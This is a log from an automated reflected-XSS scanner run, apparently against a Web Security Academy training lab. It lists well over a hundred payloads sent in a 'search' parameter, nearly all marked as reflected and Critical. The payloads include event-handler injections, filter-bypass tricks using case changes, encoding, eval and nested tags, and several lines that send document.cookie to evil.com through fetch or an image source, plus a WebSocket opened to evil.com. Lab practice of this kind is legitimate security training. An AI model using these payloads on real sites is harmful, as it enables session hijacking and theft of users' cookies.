+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script>,ESCAPED,No,,Low
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
